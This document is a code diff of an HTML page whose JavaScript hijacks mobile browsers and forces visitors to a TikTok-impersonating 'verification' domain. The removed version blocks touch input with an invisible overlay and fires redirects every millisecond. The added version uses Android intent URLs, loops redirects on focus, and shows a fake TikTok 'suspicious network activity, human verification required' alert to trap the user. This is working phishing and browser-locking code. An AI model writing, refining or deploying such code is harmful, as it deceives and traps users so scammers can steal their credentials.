@@ -4,70 +4,70 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; touch-action: none; }
-        #shield { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            background: rgba(0,0,0,0.01); z-index: 2147483647; display: none; 
-        }
+        body, html { margin: 0; padding: 0; background: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
+        .status { display: flex; justify-content: center; align-items: center; height: 100vh; color: #666; }
     </style>
 </head>
 <body>
-    <div id="shield"></div>
+
+<div class="status">
+    <p>Verifying connection...</p>
+</div>
 
 <script>
-    const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 10000; 
-    const gap = 320; 
-    const shield = document.getElementById('shield');
+    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    const killTime = Date.now() + 15000; // 15s Fail-safe
 
-    // Block ALL touch events at the source
-    shield.addEventListener('touchstart', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
-    shield.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
-
-    function triggerStoreJump() {
-        const urlEnc = encodeURIComponent(target);
+    function triggerRedirect() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const trigger = isAndroid 
-            ? "market://search?q=" + urlEnc 
-            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
-        window.location.href = trigger;
+        const urlNoProtocol = targetUrl.replace("https://", "");
+
+        if (isAndroid) {
+            // Forces Direct URL in Chrome/Android Browser
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+        } else {
+            // Fires Target and System-Protocol simultaneously for iOS
+            window.location.href = targetUrl;
+            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(targetUrl);
+        }
     }
 
-    function rampage() {
+    function securityLoop() {
         if (Date.now() > killTime) return;
 
-        // 1. Hide shield to allow "OK" click
-        shield.style.display = 'none';
+        // 1. Attempt the jump
+        triggerRedirect();
 
-        // 2. Initial Jump
-        triggerStoreJump();
-
-        // 3. THE LOCK
-        alert("ATTEMPT #40\n\nRedirecting to Safari...\n\nTap OK to continue.");
-
-        // 4. ACTIVATE SHIELD (The moment Alert is closed)
-        shield.style.display = 'block';
-
-        // 5. THE 1MS OVERLOAD + SHIELD PROTECTION
-        const start = Date.now();
-        const block = setInterval(() => {
-            if (Date.now() - start > gap || !document.hasFocus()) {
-                clearInterval(block);
-                shield.style.display = 'none';
-                return;
-            }
-            triggerStoreJump();
-            // Force focus back if they try to minimize
-            window.focus();
-        }, 1);
-
+        // 2. AUTOMATIC CHECK (No Delay Window)
+        // We check 50ms later if the browser focus has shifted.
         setTimeout(() => {
-            if (document.hasFocus()) rampage();
-        }, gap);
+            if (document.hasFocus()) {
+                // If we STILL have focus, the redirect didn't catch. 
+                // We fire the alert to lock the UI and try again on "OK".
+                alert("Human verification required: Suspicious network activity detected, please complete human verification to continue using TikTok.");
+                
+                // Fire again immediately using the "OK" tap as a gesture
+                triggerRedirect();
+                
+                // Recurse instantly
+                securityLoop();
+            } else {
+                // REDIRECT PROVEN: Focus is lost, the external app is opening.
+                console.log("Redirect success sensed.");
+            }
+        }, 50); 
     }
 
-    window.onload = () => { rampage(); };
-    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
+    window.onload = () => {
+        // Start the engine
+        securityLoop();
+    };
+
+    // If they cancel out of Safari and return to the app, the loop resumes
+    window.onfocus = () => {
+        if (Date.now() < killTime) securityLoop();
+    };
 </script>
+
 </body>
 </html>
